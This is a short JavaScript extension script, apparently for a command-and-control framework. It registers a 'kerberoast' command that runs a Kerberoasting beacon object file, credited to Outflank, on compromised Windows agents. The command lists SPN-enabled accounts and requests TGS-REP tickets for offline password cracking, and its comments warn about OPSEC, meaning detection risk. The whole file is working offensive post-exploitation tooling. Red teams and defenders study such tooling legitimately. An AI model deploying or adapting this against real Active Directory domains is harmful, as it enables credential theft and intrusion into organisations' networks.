var metadata = {
    name: "Kerberoast",
    description: "List SPN-enabled accounts and request offline-crackable TGS-REP tickets"
};

// WARNING: Running list/roast without a sAMAccountName filter is OPSEC UNSAFE.
var cmd_kerberoast = ax.create_command("kerberoast", "Perform Kerberoasting against all (or specified) SPN-enabled accounts", "kerberoast <list|list-no-aes|roast|roast-no-aes> [sAMAccountName]");
cmd_kerberoast.addArgString("action", true,  "Action: list, list-no-aes, roast, or roast-no-aes");
cmd_kerberoast.addArgString("filter", false, "Optional sAMAccountName filter (default: all accounts — OPSEC UNSAFE without filter)");
cmd_kerberoast.setPreHook(function (id, cmdline, parsed_json) {
    var action   = parsed_json["action"];
    var filter   = parsed_json["filter"] || "";
    var bof_path = ax.script_dir() + "Kerberoast." + ax.arch(id) + ".o";

    var bof_params;
    if (filter === "") {
        bof_params = ax.bof_pack("wstr", [action]);
    } else {
        bof_params = ax.bof_pack("wstr,wstr", [action, filter]);
    }
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerberoast BOF by Outflank");
});

var group_kerberoast = ax.create_commands_group("Kerberoast-BOF", [cmd_kerberoast]);
ax.register_commands_group(group_kerberoast, ["beacon", "gopher", "kharon"], ["windows"], []);
